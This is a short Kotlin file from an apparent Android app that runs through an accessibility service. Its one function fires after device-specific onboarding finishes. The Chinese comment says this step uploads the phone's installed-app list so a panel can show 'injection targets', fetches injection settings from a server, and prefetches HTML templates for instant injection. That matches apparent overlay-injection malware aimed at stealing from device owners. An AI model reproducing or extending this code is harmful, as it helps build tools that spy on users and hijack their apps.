package com.zaka.screenagent.flow

import android.util.Log
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 引导完成后的统一收尾（与厂商无关）：
 *   ① 上报已安装应用列表（面板「注入目标」显示本机已安装）
 *   ② 拉取服务器下发的注入配置
 *   ③ 预取模板 HTML 到本地（注入时秒开）
 *
 * 各厂商流程（MiuiFlow / SamsungFlow …）在最后一步完成后调用一次。
 */
object OnboardingHooks {

    fun complete(service: BoundaryAccessibilityService) {
        Log.d("Flow", "onboarding complete -> appList / inject settings / html prefetch")
        runCatching { service.onOnboardingComplete() }
    }
}
